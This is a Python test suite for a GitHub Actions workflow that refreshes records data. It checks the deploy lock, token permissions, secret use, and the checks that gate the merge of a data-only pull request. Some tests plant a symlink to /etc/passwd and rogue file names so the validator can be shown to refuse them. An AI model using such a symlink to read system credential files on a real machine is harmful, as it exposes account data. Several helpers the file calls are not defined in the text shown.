"""The daily-update workflow ships locked: its deploy job runs only when RECORDS_DEPLOY_ENABLED is 'true' (CEO hard
stop 1), nothing else may publish, and no secrets are used."""
import atexit
import json
import itertools
import os
import re
import shutil
import subprocess
import sys
import tempfile
from pathlib import Path

import pytest
import yaml

ROOT = Path(__file__).resolve().parent.parent
TEXT = (ROOT / ".github" / "workflows" / "daily-update.yml").read_text(encoding="utf-8")
WF = yaml.safe_load(TEXT)


LOCK = "vars.RECORDS_DEPLOY_ENABLED == 'true' && github.ref == 'refs/heads/main'"
# pipeline/deploy-independent-of-push: the lock, then the results of the two jobs deploy needs. A status function
# (!cancelled()) replaces GitHub's implicit success(), which would also skip deploy on the rebuild-only run, where
# push is skipped by design (the runbook's rollback path).
DEPLOY_IF = (LOCK + " && !cancelled() && needs.gate.result == 'success' && needs.update.result == 'success' && "
             "(needs.push.result == 'success' || "
             "(needs.push.result == 'skipped' && github.event_name == 'workflow_dispatch' && !inputs.collect))")


# Every `secrets.` use in the workflow: (job, step, where, env name, expression). Only the note job's two steps, only
# as env values, each the exact expression (never inside a `run:`, `with:` or `if:`).
ALLOWED_SECRETS = [
    ("note", "Mask the canary ids", "env", "CANARY_IDS", "${{ secrets.MORNING_NOTE_CANARY_IDS }}"),
    ("note", "Deliver the morning note", "env", "BUTTONDOWN_API_KEY", "${{ secrets.BUTTONDOWN_API_KEY }}"),
    ("note", "Deliver the morning note", "env", "MORNING_NOTE_CANARY_IDS",
     "${{ secrets.MORNING_NOTE_CANARY_IDS }}"),
]


def _secret_uses(wf) -> list:
    out = []

    def walk(job, step, where, value, key=None):
        if isinstance(value, dict):
            for k, v in value.items():
                walk(job, step, where if where else k, v, k)
        elif isinstance(value, list):
            for v in value:
                walk(job, step, where, v, key)
        elif "secrets." in str(value):
            out.append((job, step, where, key, str(value).strip()))
    for top, v in wf.items():
        if top != "jobs":
            walk("-", "-", str(top), v)
    for jname, job in wf["jobs"].items():
        for k, v in job.items():
            if k != "steps":
                walk(jname, "-", k, v)
        for s in job.get("steps", []):
            for k, v in s.items():
                walk(jname, s.get("name"), k, v, k)
    return out


def _deploy_if() -> str:
    return " ".join(WF["jobs"]["deploy"]["if"].split())


def test_deploy_job_is_locked():
    cond = _deploy_if()
    assert cond == DEPLOY_IF
    assert cond.startswith(LOCK + " && ")                                    # the lock stays the first condition
    assert WF["jobs"]["deploy"]["needs"] == ["gate", "update", "push"]


def _holds(expr: str, ctx: dict) -> bool:
    """A GitHub Actions `if` of the small shape used here (==, &&, ||, !, parentheses, 'strings', contexts, cancelled())
    evaluated over a made-up context. Unknown names raise KeyError, so the table below must cover every name."""
    py = re.sub(r"cancelled\(\)", "ctx['cancelled']", expr)
    py = re.sub(r"\b(?:vars|github|needs|inputs)(?:\.\w+)+", lambda m: f"ctx[{m.group(0)!r}]", py)
    py = py.replace("&&", " and ").replace("||", " or ")
    py = re.sub(r"!(?!=)", " not ", py)
    return bool(eval(py, {"__builtins__": {}}, {"ctx": ctx}))               # the workflow file is ours, not input


def _ctx(**over) -> dict:
    """A scheduled run on main, deploy enabled, both needed jobs green."""
    ctx = {"vars.RECORDS_DEPLOY_ENABLED": "true", "github.ref": "refs/heads/main", "github.event_name": "schedule",
           "inputs.collect": None, "inputs.allow_shrink": None, "needs.update.result": "success",
           "needs.push.result": "success", "needs.gate.result": "success", "needs.gate.outputs.verified": "false",
           "cancelled": False}
    return {**ctx, **{k.replace("__", "."): v for k, v in over.items()}}


def test_deploy_needs_a_successful_push():
    """pipeline/deploy-independent-of-push: no deploy when the push job failed (or was cancelled, or was skipped on a
    collecting run): the site must never go live from data that is not on main."""
    cond = _deploy_if()
    assert _holds(cond, _ctx())                                                           # the daily run
    for result in ("failure", "cancelled", "skipped"):
        assert not _holds(cond, _ctx(needs__push__result=result)), result
        assert not _holds(cond, _ctx(needs__push__result=result, github__event_name="workflow_dispatch",
                                     inputs__collect=True)), result
    for result in ("failure", "cancelled", "skipped"):
        assert not _holds(cond, _ctx(needs__update__result=result, needs__push__result="skipped")), result
    assert not _holds(cond, _ctx(cancelled=True))


def test_deploy_needs_a_successful_gate():
    """main-protect M-A: a refused (or cancelled) gate stops the deploy, also on the rebuild-only run; phase 0
    (verified false, gate green) deploys as before."""
    cond = _deploy_if()
    rebuild = dict(github__event_name="workflow_dispatch", inputs__collect=False, needs__push__result="skipped")
    for result in ("failure", "cancelled", "skipped"):
        assert not _holds(cond, _ctx(needs__gate__result=result)), result
        assert not _holds(cond, _ctx(needs__gate__result=result, **rebuild)), result
    assert _holds(cond, _ctx(needs__gate__outputs__verified="false"))
    assert _holds(cond, _ctx(needs__gate__outputs__verified="true"))


def test_rebuild_only_run_still_deploys_without_a_push():
    """collect = false (the runbook's rollback and redeploy path) has no data to commit: push is skipped by its own
    `if`, and deploy runs from the committed data. A failed push never counts, whatever the inputs say."""
    cond = _deploy_if()
    rebuild = dict(github__event_name="workflow_dispatch", inputs__collect=False, needs__push__result="skipped")
    assert _holds(cond, _ctx(**rebuild))
    assert not _holds(cond, _ctx(**{**rebuild, "needs__push__result": "failure"}))
    assert not _holds(cond, _ctx(**{**rebuild, "needs__update__result": "failure"}))
    push_if = WF["jobs"]["push"]["if"]                    # the push job is skipped exactly when deploy allows 'skipped'
    assert not _holds(push_if, _ctx(**rebuild)) and _holds(push_if, _ctx())


def test_the_lock_and_main_only_hold_in_every_case():
    """Hard stop 1: whatever the job results and inputs, no deploy unless the variable is exactly 'true', on main."""
    cond = _deploy_if()
    results = ("success", "failure", "cancelled", "skipped")
    for var, ref in (("", "refs/heads/main"), ("false", "refs/heads/main"), ("True", "refs/heads/main"),
                     ("true", "refs/heads/other"), ("", "refs/heads/other")):
        for upd, push, event, collect, cancelled in itertools.product(
                results, results, ("schedule", "workflow_dispatch"), (None, True, False), (False, True)):
            ctx = _ctx(vars__RECORDS_DEPLOY_ENABLED=var, github__ref=ref, needs__update__result=upd,
                       needs__push__result=push, github__event_name=event, inputs__collect=collect,
                       cancelled=cancelled)
            assert not _holds(cond, ctx), ctx


def test_only_the_deploy_job_can_publish():
    assert "pages" not in (WF["jobs"]["update"]["permissions"] or {})
    assert "id-token" not in (WF["jobs"]["update"]["permissions"] or {})
    assert WF["jobs"]["deploy"]["permissions"] == {"pages": "write", "id-token": "write"}
    assert TEXT.count("actions/deploy-pages@") == 1
    assert WF["permissions"] == {}                       # least privilege: each job grants its own


def test_no_secrets_and_pinned_actions():
    assert _secret_uses(WF) == ALLOWED_SECRETS          # only the note job, only as one step's env
    for line in TEXT.splitlines():
        if line.strip().startswith(("- uses:", "uses:")):
            ref = line.split("uses:")[1].split("#")[0].strip().split("@")[1]
            assert len(ref) == 40 and set(ref) <= set("0123456789abcdef"), line


def test_runs_daily_and_on_demand():
    on = WF.get("on") or WF[True]
    assert on["schedule"] and "workflow_dispatch" in on


def test_cname_in_build_output():
    assert (ROOT / "deploy" / "CNAME").read_text(encoding="utf-8").strip() == "daylight.gnoshcodes.com"
    assert "cp deploy/CNAME build/site/CNAME" in TEXT


def test_launch_overrides_are_read_from_the_environment(monkeypatch):
    import importlib

    from sitegen import config
    try:
        monkeypatch.setenv("RECORDS_SITE_URL", "https://daylight.gnoshcodes.com/")
        monkeypatch.setenv("RECORDS_BUILD_TARGET", "pages")
        importlib.reload(config)
        assert config.SITE["alerts"]["site_url"] == "https://daylight.gnoshcodes.com/"
        assert config.max_files() == 3000
    finally:
        monkeypatch.undo()
        importlib.reload(config)
    assert config.max_files() == 500 and config.SITE["alerts"]["site_url"] == "https://daylight.gnoshcodes.com/"


def test_untrusted_parse_job_has_no_write_token():
    """pipeline/token-exposure-untrusted-parse: the update job parses downloaded PDFs, so it gets no write access and
    no persisted token; only the small push job (which parses nothing) can write to the repository."""
    jobs = WF["jobs"]
    assert jobs["update"]["permissions"] == {"contents": "read", "issues": "write"}
    checkout = [s for s in jobs["update"]["steps"] if "actions/checkout@" in s.get("uses", "")]
    assert checkout and all(s["with"]["persist-credentials"] is False for s in checkout)
    writers = [n for n, j in jobs.items() if (j.get("permissions") or {}).get("contents") == "write"]
    assert writers == ["push"]
    assert jobs["push"]["needs"] == ["gate", "update"]
    assert "git push" not in "\n".join(s.get("run", "") for s in jobs["update"]["steps"])
    assert not any("python" in s.get("run", "") for s in jobs["push"]["steps"])      # parses nothing
    assert jobs["deploy"]["needs"] == ["gate", "update", "push"]


COMMIT_STEP = "Commit refreshed data to a data branch"
MERGE_STEP = "Open and merge the data pull request"


def _push_run_text():
    return "\n".join(s.get("run", "") for s in WF["jobs"]["push"]["steps"])


def test_push_commits_on_the_update_sha_then_rebases():
    """pipeline/push-reverts-concurrent-data: a concurrent data/ edit on main must conflict, never be reverted."""
    jobs = WF["jobs"]
    assert jobs["update"]["outputs"]["sha"] == "${{ steps.checkout.outputs.commit }}"
    assert any(s.get("id") == "checkout" and "actions/checkout@" in s["uses"] for s in jobs["update"]["steps"])
    checkout = [s for s in jobs["push"]["steps"] if "actions/checkout@" in s.get("uses", "")]
    assert len(checkout) == 1 and checkout[0]["with"]["ref"] == "${{ needs.update.outputs.sha }}"
    run = _push_run_text()
    assert (run.index("git commit") < run.index("git pull --rebase origin main")
            < run.index('git push origin "HEAD:refs/heads/$branch"'))
    pushes = [ln.strip() for ln in run.splitlines() if "git push" in ln]
    assert pushes == ['git push origin "HEAD:refs/heads/$branch"']          # one push, to the data branch only
    assert not any("--force" in ln or " -f" in ln or "+" in ln for ln in pushes)


def test_push_validates_the_artifact_before_staging():
    """pipeline/push-unvalidated-artifact: no symlinks, only tracked file types, 50 MB cap, checked before git add."""
    steps = WF["jobs"]["push"]["steps"]
    names = [s.get("name", "") for s in steps]
    validate = steps[names.index("Validate refreshed data")]["run"]
    assert "! -type f ! -type d" in validate                      # symlinks and special files
    assert "*.json|*.yml|*/changes.jsonl) ;;" in validate          # allowlist: what data/ tracks, and the change logs
    assert validate.count(";;") == 2                               # that list and the refusing default, nothing else
    assert "-size +50M" in validate
    assert names.index("Validate refreshed data") < names.index(COMMIT_STEP)
    assert names.index("Download refreshed data") < names.index("Validate refreshed data")
    assert "git add" not in validate


def test_tracked_data_files_fit_the_allowlist():
    """I-data on the committed tree: every `git ls-tree -r -z HEAD -- data` entry, as bytes, fits the gate's own SHAPE
    (regular 100644 files, plain names, .json/.yml or changes.jsonl), and there is at least one."""
    out = subprocess.run(["git", "ls-tree", "-r", "-z", "HEAD", "--", "data"], cwd=ROOT, capture_output=True,
                         check=True).stdout
    entries = [e for e in out.split(b"\0") if e]
    shape = re.compile(_gate_shape())
    assert entries
    for e in entries:
        assert shape.fullmatch(e), e


def _validate(folder: Path, tmp_path: Path) -> subprocess.CompletedProcess:
    """The push job's own "Validate refreshed data" script, run over `folder` standing for the downloaded artifact."""
    step = next(s for s in WF["jobs"]["push"]["steps"] if s.get("name") == "Validate refreshed data")
    runner = tmp_path / "runner"
    art = runner / "records-data"
    shutil.copytree(folder, art, symlinks=True)
    return subprocess.run(["bash", "-c", step["run"]], env={**os.environ, "RUNNER_TEMP": str(runner)},
                          capture_output=True, text=True)


def test_a_changed_document_passes_the_push_validation(tmp_path):
    """pipeline/changes-jsonl-rejected: when a document changes, collector/store.py appends to changes.jsonl beside the
    manifest. The push job must accept that data folder, or the change is never committed and repeats every day."""
    from collector.tests.test_fin_fetch import ARCHIVE, FIXTURE_HTML, _fin_fetch
    data = tmp_path / "data"            # stands for data/: manifest.json and changes.jsonl side by side
    data.mkdir()
    routes = {ARCHIVE: (200, FIXTURE_HTML, {"Content-Type": "text/html"})}
    _fin_fetch(data, routes)                                                   # day 1: first collection
    routes[ARCHIVE] = (200, FIXTURE_HTML.replace(b"MAY 4, 2026", b"MAY 5, 2026"), {"Content-Type": "text/html"})
    log, _, _, _ = _fin_fetch(data, routes)                                    # day 2: the county edits one row
    assert log["archive"]["status"] == "changed"
    shutil.rmtree(data / "store", ignore_errors=True)                          # the artifact excludes data/store
    for p in list(data.rglob("*.pdf")) + list(data.rglob("*.part")):
        p.unlink()
    assert (data / "changes.jsonl").is_file() and (data / "manifest.json").is_file()
    r = _validate(data, tmp_path)
    assert r.returncode == 0, "the push job refuses the refreshed data: " + r.stdout.replace(str(tmp_path), "<tmp>")


def test_every_change_log_the_collector_writes_passes(tmp_path):
    """Each Store writes changes.jsonl beside its own manifest (county, city, county agendas, RPC): all are allowed."""
    data = tmp_path / "data"
    for sub in ("", "localities/clarksville-tn", "county-agendas", "localities/clarksville-tn/rpc"):
        (data / sub).mkdir(parents=True, exist_ok=True)
        (data / sub / "manifest.json").write_text("[]\n")
        (data / sub / "changes.jsonl").write_text("{}\n")
    (data / "names.yml").write_text("[]\n")
    assert _validate(data, tmp_path).returncode == 0


@pytest.mark.parametrize("name", ["run.sh", "notes.jsonl", "changes.jsonl.sh", "x.pdf", "changes.jsonl/evil.py",
                                  "localities/a/audit.jsonl", "xchanges.jsonl", ".gitattributes"])
def test_other_file_types_are_still_refused(tmp_path, name):
    """The allowlist stays an allowlist: only *.json, *.yml and files named exactly changes.jsonl."""
    data = tmp_path / "data"
    (data / name).parent.mkdir(parents=True, exist_ok=True)
    (data / name).write_text("x\n")
    (data / "manifest.json").write_text("[]\n")
    r = _validate(data, tmp_path)
    assert r.returncode == 1 and "file type not allowed in data/" in r.stdout


def test_an_empty_artifact_is_refused(tmp_path):
    """I-data: merging an empty data/ would leave main with no data/ tree, which the gate refuses on every run."""
    data = tmp_path / "data"
    (data / "sub").mkdir(parents=True)
    r = _validate(data, tmp_path)
    assert r.returncode == 1 and "the refreshed data holds no file" in r.stdout


def test_a_symlinked_change_log_is_still_refused(tmp_path):
    data = tmp_path / "data"
    data.mkdir()
    (data / "manifest.json").write_text("[]\n")
    (data / "changes.jsonl").symlink_to("/etc/passwd")
    r = _validate(data, tmp_path)
    assert r.returncode == 1 and "not a regular file or directory" in r.stdout


def test_push_failure_opens_an_issue():
    """pipeline/push-failure-silent."""
    push = WF["jobs"]["push"]
    assert push["permissions"] == {"contents": "write", "pull-requests": "write", "issues": "write"}
    last = push["steps"][-1]
    assert last["if"] == "failure()" and "Daily update failed" in last["run"] and "gh issue" in last["run"]
    runbook = (ROOT / "docs" / "ops" / "launch-runbook.md").read_text(encoding="utf-8")
    assert "A failure in `update` or `push` opens" in runbook
    assert "`deploy` needs both" in runbook               # pipeline/deploy-independent-of-push: the text is now true


def test_push_and_deploy_run_on_main_only():
    """pipeline/dispatch-non-main-ref: a manual run on another branch cannot commit to main or deploy."""
    assert "github.ref == 'refs/heads/main'" in WF["jobs"]["push"]["if"]
    assert "github.ref == 'refs/heads/main'" in WF["jobs"]["deploy"]["if"]
    assert "github.event_name == 'schedule' || inputs.collect" in WF["jobs"]["push"]["if"]


# ------------------------------------------------------------------ main-protect/actions-bypass-reopens-M1: the data PR
# The main ruleset has no bypass, so the push job never pushes main: its data/ commit goes to a data/<date> branch,
# and the job opens a pull request and merges it with GITHUB_TOKEN only after checking it touches data/ only.
def _push_steps():
    return {s.get("name"): s for s in WF["jobs"]["push"]["steps"]}


def test_the_push_job_never_pushes_main():
    run = _push_run_text()
    assert "HEAD:main" not in run and "refs/heads/main" not in run
    steps = WF["jobs"]["push"]["steps"]
    names = [s.get("name") for s in steps]
    assert names[-3:] == [COMMIT_STEP, MERGE_STEP, "Open an issue on failure"]
    merge = _push_steps()[MERGE_STEP]
    assert merge["if"] == "steps.commit.outputs.branch != ''"
    assert merge["env"] == {"GH_TOKEN": "${{ github.token }}", "BRANCH": "${{ steps.commit.outputs.branch }}",
                            "SHA": "${{ steps.commit.outputs.sha }}", "MAIN_SHA": "${{ steps.commit.outputs.main }}",
                            "TITLE": "${{ steps.commit.outputs.title }}"}
    assert "${{" not in merge["run"] and "${{" not in _push_steps()[COMMIT_STEP]["run"]
    assert "pull_request_target" not in TEXT and "workflows: write" not in TEXT
    script = (ROOT / "scripts" / "protect-main.ps1").read_text(encoding="utf-8")
    assert MERGE_STEP in script            # the script refuses to drop the bypass until main has this step


def _data_repo(tmp_path, main_after=None):
    """origin with main = U (data/x.json, data/y.json, sender/a.py), plus `main_after` commits on top ({path: text}
    each); a full clone `work` checked out at U, as the push job's checkout of the update job's sha."""
    origin, src, work = tmp_path / "origin.git", tmp_path / "src", tmp_path / "work"
    _git(tmp_path, "init", "-q", "--bare", str(origin))
    _git(tmp_path, "init", "-q", str(src))
    for rel in ("data/x.json", "data/y.json", "sender/a.py"):
        (src / rel).parent.mkdir(parents=True, exist_ok=True)
        (src / rel).write_text("1\n")
    _git(src, "add", "-A")
    _git(src, "commit", "-q", "-m", "U")
    u = _git(src, "rev-parse", "HEAD")
    for files in main_after or []:
        for rel, text in files.items():
            (src / rel).parent.mkdir(parents=True, exist_ok=True)
            (src / rel).write_text(text)
        _git(src, "add", "-A")
        _git(src, "commit", "-q", "-m", "later")
    _git(src, "push", "-q", f"file://{origin}", "HEAD:refs/heads/main")
    _git(tmp_path, "clone", "-q", f"file://{origin}", str(work))
    _git(work, "checkout", "-q", "--detach", u)
    return origin, work, u


def _run_commit_step(tmp_path, work, new_data: dict, allowed=""):
    runner = tmp_path / "runner"
    art = runner / "records-data"
    shutil.copytree(work / "data", art)
    for rel, text in new_data.items():
        (art / rel).parent.mkdir(parents=True, exist_ok=True)
        if text is None:
            (art / rel).unlink()
        elif isinstance(text, tuple):           # ("exec", text): an executable file, as cp -a would carry it
            (art / rel).write_text(text[1])
            (art / rel).chmod(0o755)
        else:
            (art / rel).write_text(text)
    out = tmp_path / "github-output"
    out.write_text("")
    env = {**os.environ, "RUNNER_TEMP": str(runner), "GITHUB_OUTPUT": str(out), "GITHUB_RUN_ID": "77",
           "GITHUB_RUN_ATTEMPT": "2", "ALLOWED": allowed, "GIT_CONFIG_GLOBAL": "/dev/null"}
    r = subprocess.run(["bash", "-c", _push_steps()[COMMIT_STEP]["run"]], cwd=work, env=env, capture_output=True,
                       text=True)
    outputs = dict(ln.split("=", 1) for ln in out.read_text().splitlines() if "=" in ln)
    return r, outputs


def _branches(origin):
    return sorted(_git(origin, "for-each-ref", "--format=%(refname)", "refs/heads").split())


def test_the_data_commit_goes_to_its_own_branch_on_top_of_main(tmp_path):
    later = [{"sender/a.py": "2\n"}, {"docs/new.md": "x\n"}]     # main moved on (a merged PR) since the update job
    origin, work, _ = _data_repo(tmp_path, later)
    main_before = _git(origin, "rev-parse", "refs/heads/main")
    r, out = _run_commit_step(tmp_path, work, {"x.json": "2\n", "y.json": None, "new/z.json": "3\n"})
    assert r.returncode == 0, r.stdout + r.stderr
    import datetime
    day = datetime.datetime.now(datetime.timezone.utc).strftime("%Y-%m-%d")
    assert out["branch"] == f"data/{day}-run77-2" and out["title"] == f"Daily update: refreshed records data ({day})"
    assert _git(origin, "rev-parse", "refs/heads/main") == main_before                      # main untouched
    assert _branches(origin) == ["refs/heads/data/" + out["branch"][5:], "refs/heads/main"]
    sha = _git(origin, "rev-parse", f"refs/heads/{out['branch']}")
    assert sha == out["sha"] and _git(origin, "rev-parse", f"{sha}^") == main_before         # one commit on main
    assert out["main"] == main_before                                                        # for the L-C check
    changed = _git(origin, "diff", "--name-only", main_before, sha).split()
    assert changed == ["data/new/z.json", "data/x.json", "data/y.json"]


def test_no_data_change_pushes_nothing_and_skips_the_pr(tmp_path):
    origin, work, _ = _data_repo(tmp_path)
    r, out = _run_commit_step(tmp_path, work, {})
    assert r.returncode == 0 and "No data changes." in r.stdout and out == {}
    assert _branches(origin) == ["refs/heads/main"]


_PUSH_BAD = [("executable", {"x.json": ("exec", "2\n")}, "C.UTF-8"),
             ("non-utf8-name", {os.fsdecode(b"\xff.json"): "2\n"}, "C.UTF-8"),
             ("non-utf8-name", {os.fsdecode(b"\xff.json"): "2\n"}, "C"),
             ("space-in-name", {"a b.json": "2\n"}, "C.UTF-8"),
             ("emptied", {"x.json": None, "y.json": None}, "C.UTF-8")]


@pytest.mark.parametrize("new,loc", [(n, loc) for _, n, loc in _PUSH_BAD], ids=[f"{i}-{loc}" for i, _, loc in _PUSH_BAD])
def test_the_push_job_checks_i_data_on_the_commit_it_pushes(tmp_path, new, loc, monkeypatch):
    """J2 runs the gate's checks on the rebased commit before anything leaves the runner: an executable bit cp -a
    carried over, a name the gate would refuse, or an emptied data/ is refused; nothing is pushed."""
    monkeypatch.setenv("LC_ALL", loc)
    origin, work, _ = _data_repo(tmp_path)
    _git(work, "config", "core.fileMode", "true")
    r, out = _run_commit_step(tmp_path, work, new)
    assert r.returncode == 1 and out == {}, r.stdout + r.stderr
    assert "does not meet I-data" in r.stdout or "not a folder in the data commit" in r.stdout, r.stdout
    assert _branches(origin) == ["refs/heads/main"]
    for ln in r.stdout.splitlines():
        if ln.startswith("::error::"):
            assert all(0x20 <= ord(c) <= 0x7E for c in ln), ln


def test_the_gate_and_the_push_job_carry_the_identical_shape():
    gate = [ln.strip() for ln in _gate_steps()[GATE_STEP]["run"].splitlines() if ln.strip().startswith("SHAPE=")]
    push = [ln.strip() for ln in _push_steps()[COMMIT_STEP]["run"].splitlines() if ln.strip().startswith("SHAPE=")]
    assert len(gate) == 1 and gate == push
    run = _push_steps()[COMMIT_STEP]["run"]
    assert run.index("git pull --rebase origin main") < run.index('LC_ALL=C grep -zacE -- "$SHAPE"') \
        < run.index('git push origin "HEAD:refs/heads/$branch"')
    assert "git cat-file -t HEAD:data" in run and '[ "$matched" != "$total" ]' in run and '"$total" -lt 1' in run


def test_a_concurrent_data_edit_on_main_fails_loudly(tmp_path):
    """pipeline/push-reverts-concurrent-data, still: a concurrent data/ edit conflicts, nothing is pushed."""
    origin, work, _ = _data_repo(tmp_path, [{"data/x.json": "main\n"}])
    r, out = _run_commit_step(tmp_path, work, {"x.json": "run\n"})
    assert r.returncode != 0 and out == {}
    assert _branches(origin) == ["refs/heads/main"]


def test_the_allow_shrink_override_is_named_in_the_pr_title(tmp_path):
    origin, work, _ = _data_repo(tmp_path)
    r, out = _run_commit_step(tmp_path, work, {"x.json": "2\n"}, allowed="yes")
    assert r.returncode == 0 and "allow_shrink" in out["title"]


_MERGE_GH = '''#!/usr/bin/env python3
import json, os, subprocess, sys
a = sys.argv[1:]
with open(os.environ["GH_CALLS"], "a") as f:
    f.write(json.dumps(a) + "\\n")
st = json.load(open(os.environ["GH_STATE"]))
assert a[0] == "api" and os.environ["GH_TOKEN"] == "t", a
def jq(data):
    filt = a[a.index("--jq") + 1]
    r = subprocess.run(["jq", "-r", filt], input=json.dumps(data), capture_output=True, text=True)
    sys.stdout.write(r.stdout); sys.stderr.write(r.stderr); sys.exit(r.returncode)
if a[1:3] == ["-X", "POST"]:
    assert a[3] == "repos/o/r/pulls" and "base=main" in a and "head=" + os.environ["BRANCH"] in a, a
    jq({"number": 12})
if a[1:3] == ["-X", "PUT"]:
    assert a[3] == "repos/o/r/pulls/12/merge", a
    if st.get("merge_fails"):
        sys.exit(1)
    jq({"merged": True})
if a[1:3] == ["-X", "DELETE"]:
    sys.exit(0)
reads = os.environ["GH_CALLS"] + ".reads"
n = int(open(reads).read()) if os.path.exists(reads) else 0
files_now = st["steps"][min(n, len(st["steps"]) - 1)]
if a[1] == "--paginate":
    assert a[2] == "repos/o/r/pulls/12/files?per_page=100", a
    open(reads, "w").write(str(n + 1))
    files = files_now
    # the real API pages these 100 at a time; --paginate joins the pages before --jq runs on each
    for i in range(0, max(len(files), 1), 100):
        r = subprocess.run(["jq", "-r", a[a.index("--jq") + 1]], input=json.dumps(files[i:i + 100]),
                           capture_output=True, text=True)
        sys.stdout.write(r.stdout)
    sys.exit(0)
assert a[1] == "repos/o/r/pulls/12", a
jq({"changed_files": len(files_now), **st["pr"]})
'''


def _merge_case(tmp_path, files, pr=None, merge_fails=False, local=None, server_steps=None):
    """Run the merge step in a local repo whose data commit changes `local` (default: the names in `files`, both
    names of a rename) on top of main, against a stub gh serving `files` (or, per read, `server_steps`)."""
    _need_jq()
    repo = tmp_path / "repo"
    _git(tmp_path, "init", "-q", str(repo))
    names = local if local is not None else sorted({n for f in files for n in (f["filename"], f.get("previous_filename"))
                                                    if n})
    for rel in names:                                     # main holds every name: the data commit changes each one
        (repo / rel).parent.mkdir(parents=True, exist_ok=True)
        (repo / rel).write_text("old\n")
    (repo / "README").write_text("x\n")
    _git(repo, "add", "-A")
    _git(repo, "commit", "-q", "-m", "main")
    main_sha = _git(repo, "rev-parse", "HEAD")
    for rel in names:
        (repo / rel).write_text("new\n")
    _git(repo, "add", "-A")
    _git(repo, "commit", "-q", "--allow-empty", "-m", "data")
    sha = _git(repo, "rev-parse", "HEAD")
    branch = "data/2026-11-17-run77-1"
    steps = server_steps or [files]
    base_pr = {"state": "open", "base": {"ref": "main"}, "head": {"ref": branch, "sha": sha,
               "repo": {"full_name": "o/r"}}}
    state = {"steps": steps, "pr": {**base_pr, **(pr or {})}, "merge_fails": merge_fails}
    bindir = tmp_path / "bin"
    bindir.mkdir()
    (bindir / "gh").write_text(_MERGE_GH)
    (bindir / "sleep").write_text("#!/bin/sh\nexit 0\n")
    for f in ("gh", "sleep"):
        (bindir / f).chmod(0o755)
    (tmp_path / "state.json").write_text(json.dumps(state))
    calls = tmp_path / "calls"
    env = {**os.environ, "PATH": f"{bindir}:{os.environ['PATH']}", "GH_TOKEN": "t", "GH_CALLS": str(calls),
           "GH_STATE": str(tmp_path / "state.json"), "GITHUB_REPOSITORY": "o/r", "GITHUB_RUN_ID": "77",
           "GITHUB_SERVER_URL": "https://github.com", "BRANCH": branch, "SHA": sha, "MAIN_SHA": main_sha,
           "TITLE": "Daily update: refreshed records data (2026-11-17)"}
    r = subprocess.run(["bash", "-c", _push_steps()[MERGE_STEP]["run"]], cwd=repo, env=env, capture_output=True,
                       text=True)
    made = [json.loads(ln) for ln in calls.read_text().splitlines()] if calls.exists() else []
    merges = [c for c in made if c[1:3] == ["-X", "PUT"]]
    return r, merges, made


def _f(name, prev=None):
    return {"filename": name, **({"previous_filename": prev} if prev else {})}


def test_a_data_only_pr_is_merged_pinned_to_its_checked_commit(tmp_path):
    files = [_f(f"data/d{i}.json") for i in range(150)] + [_f("data/new.json", prev="data/old.json")]
    r, merges, made = _merge_case(tmp_path, files)
    assert r.returncode == 0, r.stdout + r.stderr
    assert len(merges) == 1
    m = merges[0]
    sha = next(c for c in made if c[1] == "repos/o/r/pulls/12")             # pinned to the local data commit
    assert "merge_method=squash" in m and any(x.startswith("sha=") and len(x) == 44 for x in m), (m, sha)
    assert "changes 151 file(s), all under data/" in r.stdout
    assert any(c[1:3] == ["-X", "DELETE"] and c[3] == "repos/o/r/git/refs/heads/data/2026-11-17-run77-1"
               for c in made)


@pytest.mark.parametrize("files", [
    [_f("data/x.json"), _f("sender/deliver.py")],
    [_f(".github/workflows/daily-update.yml")],
    [_f("datax/y.json")],
    [_f("data")],
    [_f("data/x.json"), _f("data/moved.py", prev="sender/deliver.py")],     # renamed in from outside data/
    [_f("json.py")],
], ids=["sender", "workflow", "datax", "bare-data", "rename-in", "root-py"])
def test_a_pr_touching_anything_outside_data_is_never_merged(tmp_path, files):
    r, merges, _ = _merge_case(tmp_path, files, local=["data/x.json"])
    assert r.returncode == 1 and merges == [] and "outside data/" in r.stdout


@pytest.mark.parametrize("pr", [{"state": "closed"}, {"base": {"ref": "dev"}},
                                {"head": {"ref": "data/other", "sha": "c" * 40, "repo": {"full_name": "o/r"}}},
                                {"head": {"ref": "data/2026-11-17-run77-1", "sha": "d" * 40,
                                          "repo": {"full_name": "o/r"}}},
                                {"head": {"ref": "data/2026-11-17-run77-1", "sha": "SHA",
                                          "repo": {"full_name": "fork/r"}}},
                                {"changed_files": 3001}, {"changed_files": 5}],
                         ids=["closed", "base", "head-ref", "head-sha", "fork", "over-cap", "count-mismatch"])
def test_a_pr_that_is_not_exactly_this_runs_data_pr_is_never_merged(tmp_path, pr):
    if pr.get("head", {}).get("sha") == "SHA":       # the right commit, from a fork
        pr = {"head": {**pr["head"], "sha": None}}
    r, merges, _ = _merge_case(tmp_path, [_f("data/x.json")], pr=pr)
    assert r.returncode == 1 and merges == [], r.stdout + r.stderr


@pytest.mark.parametrize("server,local", [
    ([], ["data/x.json"]),                                             # a 0-file PR (GitHub's list not ready, or empty)
    ([_f("data/x.json")], ["data/x.json", "data/y.json"]),             # the PR's list misses a file
    ([_f("data/x.json"), _f("data/y.json")], ["data/x.json"]),         # the PR lists an extra data/ file
    ([_f("data/z.json", prev="data/x.json")], ["data/x.json"]),        # a rename whose new name the commit lacks
], ids=["zero-files", "missing", "extra", "rename-extra"])
def test_l_c_a_pr_list_that_is_not_the_local_list_is_never_merged(tmp_path, server, local):
    """main-protect L-C: the PR's names must be non-empty and equal the local data commit's; re-read 5 times."""
    r, merges, made = _merge_case(tmp_path, server, local=local)
    assert r.returncode == 1 and merges == [], r.stdout + r.stderr
    assert sum(c[1] == "--paginate" for c in made) == 5 and "not exactly the local data commit's" in r.stdout


def test_l_c_a_list_that_catches_up_on_a_re_read_merges(tmp_path):
    files = [_f("data/x.json"), _f("data/y.json")]
    r, merges, made = _merge_case(tmp_path, files, server_steps=[[], [files[0]], files])
    assert r.returncode == 0 and len(merges) == 1, r.stdout + r.stderr
    assert sum(c[1] == "--paginate" for c in made) == 3


def test_l_c_a_rename_inside_data_matches_the_local_list(tmp_path):
    """GitHub may report a delete plus an add as a rename (or not): the set of names is the same either way."""
    r, merges, _ = _merge_case(tmp_path, [_f("data/new.json", prev="data/old.json")],
                               local=["data/new.json", "data/old.json"])
    assert r.returncode == 0 and len(merges) == 1, r.stdout + r.stderr


def test_a_merge_that_keeps_failing_fails_the_job(tmp_path):
    r, merges, _ = _merge_case(tmp_path, [_f("data/x.json")], merge_fails=True)
    assert r.returncode == 1 and len(merges) == 6 and "could not be merged" in r.stdout


